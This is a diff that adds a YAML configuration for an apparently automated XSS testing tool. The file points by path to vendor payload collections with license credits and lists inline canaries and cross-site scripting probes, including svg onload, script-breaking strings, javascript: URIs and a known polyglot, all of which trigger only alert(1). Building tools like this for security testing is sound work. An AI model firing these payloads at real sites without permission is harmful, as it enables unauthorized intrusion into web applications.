@@ -1,0 +1,38 @@
+# XSS payload sources — REFERENCED, never copied (license hygiene).
+# Globs resolve at load time via PayloadSource.resolve(repo_root); upstream_doc
+# entries are read by path only so CC-BY-SA prose never contaminates our AGPL skill.
+payloads:
+  - kind: glob
+    path: "vendor/PayloadsAllTheThings/XSS Injection/Intruders/*.txt"
+    license: MIT
+    credit: "swisskyrepo/PayloadsAllTheThings"
+  - kind: file
+    path: "vendor/PayloadsAllTheThings/XSS Injection/README.md"
+    license: MIT
+    credit: "swisskyrepo/PayloadsAllTheThings"
+  - kind: upstream_doc
+    path: "vendor/hacktricks/pentesting-web/xss-cross-site-scripting/README.md"
+    license: CC-BY-SA-4.0
+    credit: "HackTricks — Carlos Polop"
+
+# Small inline canary/polyglot set used for fast context detection before pulling
+# the full vendor corpus. These are original, license-clean probes.
+inline:
+  canaries:
+    kind: inline
+    license: AGPL-3.0-or-later
+    credit: "a2pwn"
+    values:
+      - "a2pwnXSS7723"
+      - "'\"><a2pwnXSS7723>"
+  context_probes:
+    kind: inline
+    license: AGPL-3.0-or-later
+    credit: "a2pwn"
+    values:
+      - "\"><svg onload=alert(1)>"
+      - "'\";</script><svg onload=alert(1)>"
+      - "javascript:alert(1)"
+      - "';alert(1)//"
+      - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//"
+      - "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
